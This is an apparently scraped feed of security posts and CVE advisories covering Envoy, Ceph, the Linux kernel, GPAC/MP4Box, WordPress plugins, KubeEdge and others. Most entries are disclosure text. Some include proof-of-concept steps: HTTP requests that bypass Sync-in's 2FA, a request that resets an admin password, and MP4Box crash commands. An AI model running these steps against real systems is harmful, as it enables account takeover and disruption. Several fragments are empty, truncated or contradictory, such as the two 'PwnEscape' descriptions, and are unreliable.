posts.content: CVE-2026-73547: Envoy ext_authz null pointer deref on path-less CONNECT requests lets unauthenticated clients crash the proxy. CVSS 7.5. Fixed in 1.36.10, 1.37.6, 1.38.4, 1.39.1 - update now. https://www.valtersit.com/cve/CVE-2026-73547/ #CVE #infosec #Envoy

CVE-2026-73547.description: Envoy is an open source edge and service proxy designed for cloud-native applications. Prior to 1.36.10, 1.37.6, 1.38.4, and 1.39.1, Envoy's ext_authz filter assumes that a request contains a :path pseudoheader when applying query_parameters_to_set or query_parameters_to_remove from an authorization response. A path-less CONNECT request makes request_headers_->Path() return null, and Filter::onComplete dereferences that pointer while parsing the query string. An unauthenticated downstream client can crash the Envoy process when the filter and authorization response use query-parameter mutation. The relevant scope boundary is that the deployment must accept path-less CONNECT and configure ext_authz query-parameter mutation. This issue is fixed in versions 1.36.10, 1.37.6, 1.38.4, and 1.39.1.

#HomeLab #Ceph #blog

CVE-2025-30156.description: Ceph is an open-source distributed storage platform providing object, block, and file storage. In versions prior to 20.2.4 and 19.2.6, the CephX authentication protocol encrypts tickets with AES-128-CBC in an unauthenticated mode that uses a hard-coded initialization vector and no message authentication, allowing an attacker to forge credentials and gain cluster-wide access. Because the ciphertext is malleable and the monitor will encrypt attacker-chosen entity names, an attacker holding one low-privilege key and able to observe CephX traffic can use the monitor as an encryption oracle and splice ciphertext blocks into valid tickets for privileged entities such as Manager, MDS, and OSD. The same lack of authentication also lets an attacker with CephX permissions escalate privileges by flipping a single bit in a service ticket to set its allow_all field to true. This issue is fixed in versions 20.2.4 and 19.2.6.

posts.content:
🚨 PwnEscape (CVE-2026-99999) has been identified as a notable vulnerability.

In the Linux kernel, the following vulnerability has been resolved:

ipv4: validate checksum_start before completing checksum

If a packet with bad checksum metadata gets into the ipv4 stack,
skb_checksum_help can corrupt the network header and cause a bunch of
mischief.

This was discovered and reported by Paulos, and has been reporoduced
by others independently since.

We really shouldn't allow such packets in, but as a defence
in depth measure, let's also check before we complete the checksum.

A more complete validation at input is forthcoming, but needs more work.

ℹ️ Additional details, advisories and sightings on ZEN SecDB 👉 https://secdb.nttzen.cloud/cve/detail/CVE-2026-99999

posts.content:
Heads up for fellow Linux admins: CVE-2026-99999 (dubbed "PwnEscape") is out, and it is a nasty one (CVSS 9.3).

Despite being called a KVM escape, the actual bug lives in the host IPv4 networking stack. Untrusted CHECKSUM_PARTIAL offload metadata from a guest can overwrite already-validated packet headers during ip_do_fragment(), leaking host memory or allowing a guest-to-host escape.

Mainline patches landed Oct 14, and stable backports are out. Check your hypervisors and reboot!

https://pwn.ai/blog/pwnescape

#Linux #Kernel #SysAdmin #InfoSec #KVM #ITSEC #CVE

posts.content: CVE-2026-73548 Envoy request smuggling, CVSS 7.5. Unauthenticated HTTP/2 clients can smuggle full HTTP/1.1 requests past upstream and poison the keep-alive pool. Fixed in 1.36.10, 1.37.6, 1.38.4, 1.39.1. Update now. https://www.valtersit.com/cve/CVE-2026-73548/ #CVE #infosec #Envoy

CVE-2026-73548.description: Envoy is an open source edge and service proxy designed for cloud-native applications. Prior to 1.36.10, 1.37.6, 1.38.4, and 1.39.1, Envoy forwards data for a configured non-WebSocket HTTP upgrade before the upstream accepts the upgrade. An unauthenticated HTTP/2 client can place a complete HTTP/1.1 request in extended CONNECT data; Envoy downgrades the request, writes the data unframed to a keep-alive HTTP/1.1 upstream, and returns the socket to the shared pool while the smuggled response remains queued. A different downstream client can then receive the attacker's response. The relevant scope boundary is that webSocket upgrades, plain CONNECT, disabled backend keep-alive, per-downstream pools, and max_requests_per_connection set to 1 are not affected by the demonstrated path. This issue is fixed in versions 1.36.10, 1.37.6, 1.38.4, and 1.39.1.

🚨 Rapid Response | BeyondTrust Remote Support/Privileged Remote Access Zero-Day (CVE-2026-102764) (CVSS 9.3) is a critical vulnerability.

The flaw allows unauthenticated attackers to perform file operations on affected appliances.
Censys currently detects 9,569 Internet-exposed hosts and 177,497 web properties running BeyondTrust Remote Support or Privileged Remote Access. These figures represent detected installations, not confirmed vulnerable or unpatched instances.

BeyondTrust has released patches for both products. Organizations should prioritize patching self-hosted appliances and investigate potential compromise, as patching does not remediate prior exploitation.

Full Censys ARC advisory, including affected versions, exploitation indicators, and remediation guidance: https://censys.com/advisory/cve-2026-102764/

#CensysARC #Cybersecurity #VulnerabilityManagement #BeyondTrust #InfoSec

posts.content: CVE-2026-73553 Envoy RBAC bypass: semicolon path mismatch lets unauthenticated requests reach protected backends. CVSS 7.5. Patched in 1.36.10, 1.37.6, 1.38.4, 1.39.1. Patch now. https://www.valtersit.com/cve/CVE-2026-73553/ #CVE #infosec #Envoy

CVE-2026-73553.description: Envoy is an open source edge and service proxy designed for cloud-native applications. Prior to 1.36.10, 1.37.6, 1.38.4, and 1.39.1, When ignore_path_parameters_in_path_matching is enabled, Envoy's router strips the semicolon suffix before matching but the RBAC url_path matcher evaluates the raw path. A downstream request such as /admin;x can therefore miss a DENY rule for /admin while the router still selects the protected /admin backend. The inconsistent canonicalization allows an unauthenticated client to bypass path-based authorization. The relevant scope boundary is that the route option and a path-based RBAC rule must both be present, and the protected route must match after stripping. This issue is fixed in versions 1.36.10, 1.37.6, 1.38.4, and 1.39.1.

posts.content:
Security Advisory: CVE-2025-60492 - Uncontrolled Recursion in GPAC/MP4Box

Processing a crafted MP4 file with specially constructed BIFS scene data causes unbounded recursion between BIFS decoder functions, exhausting the stack and crashing MP4Box.

Summary:
The `gf_bifs_dec_node` function in `bifs/field_decode.c` decodes MPEG-4 BIFS scene nodes by calling `BD_DecMFFieldList`, `gf_bifs_dec_field`, and `gf_bifs_dec_node_list`, which in turn call back into `gf_bifs_dec_node`. A crafted MP4 file with deeply or cyclically nested BIFS containers triggers this mutual recursion without a depth limit, consuming all available stack memory and crashing the process with a stack-overflow signal.

CWE:
CWE-674 - Uncontrolled Recursion

Affected Component:
```
bifs/field_decode.c:905
Function: gf_bifs_dec_node()
```

Affected Product:
MP4Box (GPAC Multimedia Open Source Project)

Affected Version:
2.5-DEV-rev1687-ge44a4e2b0-master; commit `e44a4e2b0d193566619ada71599e70255699da94`. Any codebase equivalent to this commit that has not applied the fix commit is affected.

Attack Conditions:
An attacker supplies a crafted MP4 file whose embedded BIFS scene data contains deeply nested or mutually referencing node containers. Local access is required; the victim must invoke `MP4Box -x3d <crafted_file>` or any equivalent BIFS scene export command that triggers the recursive decoder path.

Impact:
The uncontrolled recursion exhausts the process stack, resulting in an immediate crash and Denial of Service. No evidence of arbitrary code execution was observed; stack-exhaustion crashes via recursion do not provide an exploitable control-flow primitive.

Fix / mitigation status:
The issue was fixed in GPAC commit:
```
8e7b9a3a04331286b89d1803c65a2d6edc11b4c4
```
Users should update to a GPAC build containing this commit or later.

References:

- Issue: https://github.com/gpac/gpac/issues/3324
- PoC: https://github.com/sigdevel/pocs/blob/main/res/gpac/MP4Box/59/59_Anchor_Create_scenegraph_mpeg4_nodes_c_171
- Fix: https://github.com/gpac/gpac/commit/8e7b9a3a04331286b89d1803c65a2d6edc11b4c4

Credit
Alexander A. Shvedov (@sigdevel)

Security Advisory: CVE-2025-60490 - Use-After-Free in GPAC/MP4Box

Processing a crafted MPEG-2 Transport Stream file triggers a heap use-after-free in `gf_filter_pid_send_event_downstream` when a freed PID instance is accessed during event propagation.

Summary:
When parsing a crafted MPEG-2 TS file with malformed PMT descriptors and sync marker violations, `gf_filter_pid_inst_swap_delete` frees a PID instance at `filter_pid.c:551`. A stale reference to this freed 344-byte region is subsequently read in `gf_filter_pid_send_event_downstream` at line 7919 (READ of 8 bytes at offset 0 of the freed object) because the pointer is not cleared after deallocation.

CWE:
CWE-416 - Use After Free

Affected Component:
```
filter_core/filter_pid.c:7919
Function: gf_filter_pid_send_event_downstream()
```

Affected Product:
MP4Box (GPAC Multimedia Open Source Project)

Affected Version:
2.5-DEV-rev1665-g3f20eb0cd-master; commit `3f20eb0cd22116367c036e6ffe6ace299b38d686`. Any codebase equivalent to this commit that has not applied the fix commit is affected.

Attack Conditions:
An attacker supplies a crafted MPEG-2 TS file containing broken PMT descriptor sizes, unsupported stream types, and missing sync markers. Local access is required; the victim must invoke `MP4Box -add <crafted_file> -new /dev/null` or any equivalent import command that triggers the filter PID event propagation path.

Impact:
The use-after-free (READ of size 8 at offset 0 inside a freed 344-byte heap region) results in process termination, causing Denial of Service. Arbitrary code execution is possible; the first MITRE request explicitly marks code execution impact as true, and use-after-free vulnerabilities at the start of a controlled heap object are a known code-execution primitive.

Fix / mitigation status:
The issue was fixed in GPAC commit:
```
d0793f92e04fe284a25c2a9335cc5edc68deb6d4
```
Users should update to a GPAC build containing this commit or later.

References:

- Issue: https://github.com/gpac/gpac/issues/3315

Security Advisory: CVE-2025-60478 - Heap Use-After-Free in GPAC Packet Destruction

Processing a crafted MPEG-2 TS input with MP4Box DASH segmentation can trigger a heap use-after-free in `gf_filter_packet_destroy()`.

Summary:
Malformed program table data and empty DASH segment state can cause GPAC to mishandle packet ownership. The file output and PID packet drop path later destroy a packet object that has already been invalidated.

AddressSanitizer reports `heap-use-after-free` in `filter_core/filter_pck.c`.

CWE:
CWE-416 - Use After Free

Affected Component:
```
filter_core/filter_pck.c:678
Function: gf_filter_packet_destroy()
```

Relevant ASAN stack:

```
gf_filter_packet_destroy filter_core/filter_pck.c:678
gf_filter_packet_destroy filter_core/filter_pck.c:684
gf_filter_pid_drop_packet filter_core/filter_pid.c:7270
fileout_process filters/out_file.c:933
```

Affected Product:
MP4Box (GPAC Multimedia Open Source Project)

Affected Version:
```
GPAC version: 2.5-DEV-rev1617-g856674b22-master
Commit: 856674b226d6cbe28a941ad223be38194cbf7d37
```

Attack Conditions:
An attacker supplies a crafted MPEG-2 TS file that is processed by MP4Box DASH segmentation:

```
./MP4Box -dash 100 47_gf_filter_packet_destroy_filter_core_filter_pck_c_678
```

Impact:
The observed impact is Denial of Service. Because the issue is a heap use-after-free, memory corruption risk is also present.

Fix / mitigation status:
The MITRE response in the local data records the fix as:

```

```

An out-of-bounds read vulnerability exists in GPAC MP4Box when processing a crafted AC-4 stream. The issue occurs in `gf_ac4_parser_bs()` in `media_tools/av_parsers.c` and is reachable during media import through MP4Box commands such as `-info`.

Security Advisory: CVE-2025-60476 - Heap Use-After-Free in GPAC MP4Box AC-4 Descriptor Cleanup

A heap use-after-free vulnerability exists in GPAC MP4Box when processing a crafted AC-4 file. The issue occurs in `gf_odf_ac4_cfg_clean_list()` in `odf/descriptors.c` during recursive cleanup of AC-4 configuration lists.

Summary:
AddressSanitizer confirms a heap-use-after-free at `odf/descriptors.c:2419`. The cleanup code accesses a list node after it has already been freed in a recursive cleanup path, causing MP4Box to crash.

The crafted AC-4 stream contains malformed configuration list data. During parsing and cleanup, `gf_odf_ac4_cfg_clean_list()` recursively destroys AC-4 configuration structures. A node is freed in a deeper cleanup level and later accessed again by the caller, resulting in a read from freed heap memory.

Security Advisory: CVE-2025-60469 - NULL Pointer Dereference in GPAC MP4Box AC-4 Parser

A NULL pointer dereference vulnerability exists in GPAC MP4Box when processing a crafted AC-4 stream. The issue occurs in `gf_ac4_presentation_ch_mode()` in `media_tools/av_parsers.c` and can be triggered by running MP4Box with the `-info` option on a malformed input file.

Summary:
AddressSanitizer confirms a segmentation fault at `media_tools/av_parsers.c:15641`. The parser attempts to read through a NULL or invalid pointer while handling an AC-4 stream with unsupported `presentation_version` and missing substream group information.

The crafted AC-4 stream declares an unsupported presentation version and omits required substream group data. MP4Box reports that `presentation_version 0` is unsupported and that substream group `1` cannot be found for presentation `0`. The error path then reaches `gf_ac4_presentation_ch_mode()` and dereferences an invalid pointer, resulting in a segmentation fault.

```

[AC4] Cannot find substream group 1 for presentation 0

==1829578==The signal is caused by a READ memory access.

```

```
./MP4Box -info 41_gf_ac4_presentation_ch_mode_media_tools_av_parsers_c_15641
```

Security Advisory: CVE-2025-60475 - Global Buffer Overflow in GPAC MP4Box AC-4 Parser

A global buffer overflow vulnerability exists in GPAC MP4Box when processing a crafted AC-4 audio stream. The issue occurs in `gf_ac4_parser_bs()` in `media_tools/av_parsers.c` and can be triggered by running MP4Box with the `-info` option on a malformed input file.

Summary:
AddressSanitizer confirms an out-of-bounds read at `media_tools/av_parsers.c:16140`. The parser accesses `AC4_SAMPLE_DELTA_TABLE_48` with an out-of-bounds index, causing a 4-byte read past the global array boundary.
The AC-4 parser reads index values from the input bitstream and uses them to access the global `AC4_SAMPLE_DELTA_TABLE_48` array. The vulnerable path does not properly validate the index before accessing the table. A crafted AC-4 stream can therefore cause a read just past the end of the global array.

CWE:
CWE-125 - Out-of-bounds Read

Affected Component:
```
media_tools/av_parsers.c:16140
Function: gf_ac4_parser_bs()
```

Affected Product:
MP4Box (GPAC Multimedia Open Source Project)

Affected Version:
```
2.5-DEV-rev1593-gfe88c3545-master
Commit: fe88c3545aadd597b250ccf23271d5d3de50ccc8
```

Attack Conditions:
An attacker supplies a crafted input file that is processed by MP4Box. The issue can be reproduced locally with:
```
./MP4Box -info 40_gf_ac4_parser_bs_media_tools_av_parsers_c_16140
```

Attack vector: local crafted AC-4 file processed by MP4Box
User interaction: required

denial of service via application crash; local triage notes also identify potential information disclosure or code execution risk

The issue was fixed in GPAC commit:

CVE-2026-111044.description: Sunshine is a self-hosted game stream host for Moonlight. From 2026.329.165800 until 2026.906.222525, Sunshine accepted any client certificate that chained to a stored paired-client certificate, but it did not require the presented certificate to be the exact enabled paired identity. Certificate text was also compared without canonicalizing equivalent PEM encodings. A previously paired client that retains its private key can present an alternate certificate derived from its paired certificate and bypass the Disable control. Equivalent PEM encodings could also cause inconsistent client identity handling. A client that was never paired cannot use this issue, and removing the paired client removes its trust relationship. This issue is fixed in version 2026.906.222525.

Update the Backuply WordPress plugin to 1.5.9 to fix CVE-2026-93953, a high-severity SQL injection vulnerability impacting 600,000 sites.

#WordPress #Backuply #SQLInjection #Wordfence #Cybersecurity #Vulnerability #InfoSec

https://securityonline.info/backuply-wordpress-plugin-sql-injection-vulnerability/?utm_source=mastodon&utm_medium=jetpack_social

CVE-2026-93953.description: The Backuply – Backup, Restore, Migrate and Clone plugin for WordPress is vulnerable to SQL Injection via the Biographical Info field (second-order, via restore) in all versions up to, and including, 1.5.8 due to insufficient escaping on the user supplied parameter and the lack of sufficient preparation on an existing SQL query. Backuply exports the Biographical Info value verbatim inside an INSERT statement written to the backup's SQL dump (wp_usermeta). When an Administrator later restores such a backup, the crafted payload breaks out of that INSERT statement and appends attacker-controlled SQL that executes with full database privileges. This makes it possible for authenticated attackers, with subscriber-level access and above, to write arbitrary data to the database — in particular to update the default_role option in wp_options to administrator (and enable open user registration) — so that a subsequently registered account is automatically granted the Administrator role, resulting in privilege escalation and full site takeover. Because the injection executes inside an INSERT during restore with no response returned to the attacker, the primitive is used to modify database records rather than to read existing data directly.

posts.content: CVE-2026-62369 KubeEdge path traversal in DecompressTarGz leads to code execution on Windows edge nodes. CVSS 8.1. Patch under review, so limit keadm installs to trusted sources now. https://www.valtersit.com/cve/CVE-2026-62369/ #CVE #infosec #KubeEdge

CVE-2026-62369.description:
## Description

KubeEdge `keadm` contains a path traversal vulnerability in the `DecompressTarGz` archive extraction function.

Archive entry names were joined directly with the extraction destination without sufficient validation. A crafted tar.gz archive containing parent-directory components, Windows-style backslashes, absolute paths, or drive-prefixed paths could cause files to be written outside the intended extraction directory.

The issue is particularly relevant to Windows edge nodes during the `keadm join` or installation process when `keadm` extracts downloaded component archives.

## Impact

An attacker who can cause an affected `keadm` process to extract a malicious archive may write or overwrite files outside the intended destination directory with the privileges of the user running `keadm`.

On Windows edge nodes, this may allow modification of configuration files, executable files, service-related files, or other writable system locations. Depending on the overwritten file and the privileges of the `keadm` process, successful exploitation could lead to persistent system modification or code execution.

Exploitation requires the attacker to influence the contents of an archive processed by `keadm`, such as through a compromised, replaced, or otherwise untrusted download source.

## Patches

The extraction logic now:

* resolves the destination directory to an absolute path;
* rejects empty archive entry names;
* normalizes Windows-style path separators before validation;
* rejects parent-directory traversal paths;
* rejects absolute and Windows drive-prefixed paths;
* uses `filepath-securejoin` to ensure extracted files remain within the destination directory.

Fixes are planned for the following maintained releases:

* v1.23.1
* v1.22.2
* v1.21.2

## Workarounds

Until a patched release is available:

* only install or join edge nodes using trusted KubeEdge package sources;
* verify the integrity and origin of downloaded archives before extraction;
* do not use custom or untrusted component archives with `keadm`;
* restrict write permissions and administrative privileges for the account running `keadm`;
* avoid performing Windows edge-node installation or join operations when the package source cannot be trusted.

## Credits

KubeEdge thanks Sang-Hoon Choi ([KoreaSecurity](https://github.com/KoreaSecurity), Sejong University)
for responsibly reporting this issue and for coordinating with the KubeEdge
maintainers through the security disclosure process.

Restrict OTP endpoints, monitor now. https://radar.offseq.com/threat/cve-2026-110653-cwe-287-improper-authentication-in-latepoint-appointment-booking-plugin-latepoint-084a535b1718f8eb #OffSeq #WordPress #CVE2026110653

CVE-2026-110653.description: The Appointment Booking Plugin – LatePoint | Calendar & Scheduling for WordPress plugin for WordPress is vulnerable to Authentication Bypass via Race Condition in all versions up to, and including, 5.7.4. This is due to a non-atomic read-modify-write on the OTP verification attempts counter in the `verifyOTP` function: the counter is incremented using a stale in-memory value with no conditional `WHERE attempts < 10` guard on the `UPDATE` and no `SELECT ... FOR UPDATE` row lock, creating a TOCTOU window that allows concurrent requests to bypass the 10-attempt lockout. This makes it possible for unauthenticated attackers — who know a target customer's registered email address or phone number — to fire concurrent requests to the `auth__verify_otp` endpoint, defeat the lockout cap, brute-force the 6-digit OTP code, and authenticate as the targeted LatePoint customer, gaining full access to their account, bookings, and personal data. The nonce check present on the endpoint (`otp_verify_otp_nonce`) does not mitigate this issue, as the nonce is publicly emitted by the unauthenticated `request_otp` and `resend_otp` endpoints and is trivially obtainable by any unauthenticated attacker prior to launching the race.

posts.content: CVE-2026-58269: Sync-in Server before 2.4.0 lets attackers bypass TOTP 2FA via the token endpoint with stolen credentials. CVSS 8.1. Patches under review, so watch for 2.4.0. Details: https://www.valtersit.com/cve/CVE-2026-58269/ #CVE #infosec #cybersecurity

CVE-2026-58269.description:
**Affected component:** Sync-in Server v2.3.0, `POST /api/auth/token` (`auth.controller.ts:50-55`).

**Required attacker capability:** Valid username and password for a 2FA-enabled account.

## Summary

`POST /api/auth/token` authenticates with username and password only, then calls `getTokens()`, which returns unrestricted Bearer access and refresh JWTs without checking whether the account has TOTP 2FA enabled. An attacker who already knows valid credentials for a 2FA-enabled account can bypass 2FA in a single request.

The parallel login endpoint (`POST /api/auth/login`) correctly enforces 2FA by calling `setCookies(user, res, true)`, which gates on `user.twoFaEnabled` when server-side TOTP is enabled.

## Details

The token endpoint at `auth.controller.ts:50-55` uses `AuthLocalGuard` (password-only) and calls `getTokens()` directly:
```typescript
// auth.controller.ts:50-55
@Post(AUTH_ROUTE.TOKEN)
@AuthTokenSkip()
@UseGuards(AuthLocalGuard)
token(@GetUser() user: UserModel): Promise<TokenResponseDto> {
  return this.authManager.getTokens(user)
}
```
`getTokens()` at `auth.service.ts:25-39` signs and returns access and refresh JWTs. It never reads `user.twoFaEnabled`:
```typescript
// auth.service.ts:25-39
async getTokens(user: UserModel, refresh = false): Promise<TokenResponseDto> {
  const currentTime = currentTimeStamp()
  // ...expiration logic...
  return {
    [TOKEN_TYPE.ACCESS]: await this.jwtSign(user, TOKEN_TYPE.ACCESS, accessExpiration),
    [TOKEN_TYPE.REFRESH]: await this.jwtSign(user, TOKEN_TYPE.REFRESH, refreshExpiration),
    // ...
  }
}
```
Compare with the login endpoint at `auth.controller.ts:30-35`, which calls `setCookies(user, res, true)`. Inside `setCookies()` at `auth.service.ts:45`, the 2FA gate fires:
```typescript
// auth.service.ts:45
const verify2Fa = init2FaVerify && configuration.auth.mfa.totp.enabled && user.twoFaEnabled
```
When `verify2Fa` is true, `setCookies()` issues only a restricted `ACCESS_2FA` token and requires the user to complete `POST /api/auth/2fa/login/verify` before receiving full session cookies. The token endpoint has no equivalent gate.

## PoC

### Prerequisites

- A Sync-in instance with TOTP 2FA enabled server-wide.
- A user account with 2FA enrolled (the target).
- The target's valid login and password, but not the TOTP secret or current TOTP code.

### Steps

1. **Enable 2FA on the target account.** Log in as the target user, navigate to Settings, and enable TOTP two-factor authentication.

2. **Confirm normal login requires 2FA.** Log out. Log back in with the target's credentials. The UI presents a TOTP code prompt before granting access, and the API response contains only `token.access_2fa_expiration` (a restricted partial token):
```
POST /api/auth/login
{"login":"test","password":"..."}

Response: {"user":{"twoFaEnabled":true},"server":{"twoFaEnabled":true},"token":{"access_2fa_expiration":1781234379}}
```
3. **Bypass 2FA via the token endpoint.** Send the same credentials to `/api/auth/token`:
```
POST /api/auth/token
{"login":"test","password":"..."}

Response:
{
  "access": "eyJhbGciOiJIUzI1NiIs...",
  "refresh": "eyJhbGciOiJIUzI1NiIs...",
  "access_expiration": 1781235890,
  "refresh_expiration": 1781248490
}
```
Unrestricted Bearer access and refresh JWTs are returned. No TOTP code was required.

4. **Confirm API access.** Use the token on a protected endpoint:
```
GET /api/users/me
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

Response: {"user":{"id":16,"login":"test","email":"test@lab.local","twoFaEnabled":true,...}}
```
The server returns the user profile. Protected API endpoints that accept Bearer authentication are accessible as the target user. No TOTP code was required at any step.

### Measured observations

- The login endpoint (`/api/auth/login`) correctly returns a restricted 2FA-pending response.
- The token endpoint (`/api/auth/token`) returns unrestricted Bearer JWTs with the same credentials and no TOTP.
- The returned Bearer token grants access to protected API endpoints as a fully authenticated user, though cookie-specific flows may differ.

## Impact

An attacker who already knows valid credentials for a 2FA-enabled account can obtain unrestricted Bearer access and refresh JWTs in a single HTTP request, without knowing the TOTP secret or possessing the authenticator device. 2FA security is bypassed for Bearer-token API authentication.

## Remediation

Gate the token endpoint behind the same 2FA policy used by the login route. After `AuthLocalGuard` validates the username and password, require a valid TOTP code when server-side TOTP is enabled and `user.twoFaEnabled` is true, before calling `getTokens()`.

CVE-2026-104736.description: The LearnPress plugin for WordPress is vulnerable to PHP Object Injection in versions up to, and including, 4.4.10 via deserialization of untrusted input from the 'checkout-email' request parameter during the checkout AJAX action. The value is passed through sanitize_text_field(), which does not strip serialized object syntax, then stored in the LearnPress session table and later fed to LP_Helper::maybe_unserialize() → unserialize() (without an allowed_classes restriction) by LP_Session_Handler::get() on subsequent requests. CVE-2026-105192.description: LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. Messages on that socket are msgpack. Extension code 1 is passed to DeviceIPCWrapper.Deserialize, which calls pickle.loads, while the server is still decoding request arguments and before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect.

CVE-2026-98260 (Timer)
This is a use-after-free caused by the interaction between an exec() failure in a thread other than the process leader and POSIX CPU timer cleanup.

CVE-2026-98256 (Signal)
This is a sigqueue use-after-free caused by a race between exec() in a nonleader thread and cleanup of a private pending signal queue.

CVE-2026-89754 (MM)
Retry state from the page table walker escapes into an upper level, causing an out-of-bounds write to the temporary result buffer used by mincore().

CVE-2026-80775 (Futex)
This is a use-after-free caused when two tasks that share an mm_struct through nested vfork() calls race to allocate the initial reference counter for FUTEX_PRIVATE_HASH.

CVE-2026-98385 (Scheduler)
This is a use-after-free caused when scheduler cache accounting continues to update per-CPU statistics belonging to a previously freed mm_struct. The vulnerable path is reached when CONFIG_SCHED_CACHE is enabled, scheduler cache is active at runtime, and the CPU topology contains multiple LLCs.

CVE-2026-97941 (SLAB)
This is a list corruption caused by a race between returning a freelist and removing a slab from the node partial list during SLUB object refill. The public trigger causes a kernel panic.

https://www.openwall.com/lists/oss-security/2026/10/16/36

#infinitycore #infosec #cybersecurity

CVE-2026-98260.description:
In the Linux kernel, the following vulnerability has been resolved:

exec: Cleanup POSIX timers right after de_thread()

A per-thread CPU timer holds a reference to the PID of the thread it is
attached to and, while it is armed, its node is queued in that thread's
posix_cputimers. The task is looked up by that PID.

When a non-leader thread exec()s, de_thread() changes which task owns
that PID. pid_task(timer->it.cpu.pid, PIDTYPE_PID) then returns NULL,
but the node is still queued on tsk, which is alive. timer_lock_sighand()
takes a failed lookup to mean that the node is already dequeued, so it
has nothing to undo.

begin_new_exec() calls posix_cpu_timers_exit(me) right after
exec_task_namespaces() and that removes the leftover node, so the state
normally stays invisible. But bprm->point_of_no_return is set before
de_thread(), so if unshare_files(), set_mm_exe_file(), exec_mmap() or
exec_task_namespaces() fails, the task dies before it gets there.
exit_itimers() then frees the k_itimer while its node is still queued,
and reaping tsk later erases that freed node from the rbtree.

In short:

      the non-leader thread B           the parent

  timer_create(CLOCK_THREAD_CPUTIME_ID)
  timer_settime()
    arm_timer()            // the node is queued on B
  execve()
    de_thread(B)
      exchange_tids(B, leader)  // B's PID now belongs to the leader
      release_task(leader)
        __exit_signal(leader)
          posix_cpu_timers_exit(leader)  // cleans leader's queue, not B's
          __unhash_process(leader)  // that PID has no task anymore
    exec_mmap()
      mmap_read_lock_killable(old_mm)
                                kill(B, SIGKILL)
      // -EINTR
  get_signal()
    do_exit()
      exit_itimers()
        posix_timer_delete()
          posix_cpu_timer_del()
        posix_timer_unhash_and_free()  // freed while still queued
                                wait4()
                                  release_task(B)
                                    posix_cpu_timers_exit(B)
                                      cleanup_timerqueue()
                                        timerqueue_del()  // use-after-free

Move the POSIX timer cleanup right after de_thread() before any of the
later failure conditions brings the task into do_exit().

[ tglx: Move the cleanup right after de_thread() ]

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-68498.description:
StreamReadConstraints.maxNameLength (default 50,000 characters) is intended to bound how much memory a single JSON Object property name can consume while being parsed, independently of the much larger maxStringLength (default 100,000,000 characters) that bounds ordinary string values. For parsers built over character input — Reader, String or char[] sources, all served by ReaderBasedJsonParser — that bound is not applied while the name is being accumulated. The code path instead re-uses the string-value length check, which is roughly 2000x larger by default.



In the character-input slow path, ReaderBasedJsonParser._parseName2() accumulates the name into the TextBuffer and, when a segment fills, calls TextBuffer.finishCurrentSegment(), which validates only maxStringLength. The correct check, StreamReadConstraints.validateNameLength(int), is reached afterwards in CharsToNameCanonicalizer.findSymbol(), once the entire name has been scanned to its closing quote. By that point the full name — up to maxStringLength characters — has already been buffered in memory.



A remote attacker who can have a single sufficiently long JSON Object property name parsed through this path can force allocation on the order of 100,000,000 characters (approximately 200 MB, with segment bookkeeping pushing real peak usage higher) before any StreamConstraintsException is thrown, instead of the approximately 50,000-character (about 100 KB) bound the API promises. Repeating this across concurrent requests can exhaust the heap and crash the process. No authentication or user interaction is required. Because StreamReadConstraints.maxDocumentLength is disabled by default (-1), nothing else bounds the token first, so the issue is exploitable under default configuration.



Byte-input parsers are not affected: UTF8StreamJsonParser, UTF8DataInputJsonParser and the non-blocking (async) parsers re-validate maxNameLength on every growth of the name-decode buffer via ParserBase._growNameDecodeBuffer(), rejecting an oversized name after allocating only tens of kilobytes. Applications are exposed when untrusted JSON is parsed from a String, Reader or char[] — for example an HTTP request body already read into a String — rather than from raw UTF-8 bytes.



This issue affects com.fasterxml.jackson.core:jackson-core from 2.16.0 and tools.jackson.core:jackson-core from 3.0.0. Releases before 2.16.0 are not affected, because StreamReadConstraints.maxNameLength was first introduced in jackson-core 2.16.0.

CVE-2026-96627.description:
## Summary
A user holding the delegated `users:update` permission can reset the global administrator's password and take over the admin account. `UpdateUser` sets the target user's `PasswordHash` from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by `RequireGlobalAdmin`, `users:update` is intended to sit BELOW admin (profile management); this finding defeats that separation.

## Root Cause
`UpdateUser` (handler `backend/api/handlers/users.go:317-323`) loads the target by ID and sets `userModel.PasswordHash` from the request body for any user, then `userService.UpdateUser` (`user_service.go:174`) simply `tx.Save`s — with NO actor-vs-target privilege comparison. The only `IsGlobalAdmin` guard (`user_service.go:345`) is a last-admin check inside `DeleteUser`, not the update path. Role assignment / role CRUD are `RequireGlobalAdmin` (`backend/pkg/authz/permissions.go:27-33`), proving `users:update` is intended below admin.

## Impact
Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated `users:update` permission.

## Proof of Concept
1. Admin delegates a custom "User Manager" role with `users:update`.
2. `PUT /users/{adminId}` with `{"password":"attacker123"}`.
3. `POST /auth/login {"username":"arcane","password":"attacker123"}` → admin session.

## Attack Chain
1. Action: admin delegates custom role with `users:update`. Guard: role creation is `RequireGlobalAdmin`. Bypass: intended delegation (holder is meant to manage profiles, not seize admin).
2. Action: `PUT /users/{adminId}` `{"password":"attacker123"}`. Guard: `RequirePermission(users:update)` (`users.go:154`). Bypass: holder has it; no hierarchy check (`users.go:317-323`, `user_service.go:174` unconditional Save).
3. Action: `POST /auth/login` as admin → admin session.

## Bypass Evidence
- `users.go:317-323` sets `PasswordHash` for any target; `user_service.go:174-194` has no actor/target privilege comparison.
- Only `IsGlobalAdmin` hits are `DeleteUser`'s last-admin guard and DTO flags (grep).
- `users:update` is org-level, held by no built-in non-admin role (`permissions.go:24`).

## Affected Versions
`<= 2.5.0`.

Reported by **zx (Jace)** — GitHub: @manus-use

CVE-2026-102608.description: ZoneMinder is a free, open source closed-circuit television software application. Prior to 1.38.3, downloadEvents() manually wraps a monitor Name value in single quotes instead of using escapeshellarg() before placing it in shell commands when a user with monitor-create or monitor-edit permission stores a monitor Name containing shell metacharacters and a user with Events View permission exports that monitor's events. In this attack mechanism, the stored monitor Name reaches both the ffmpeg concatenation command and the tar or zip archive command and breaks out of manual quoting. Arbitrary commands execute as the web server user. This issue is fixed in version 1.38.3.

CVE-2026-76519.description:
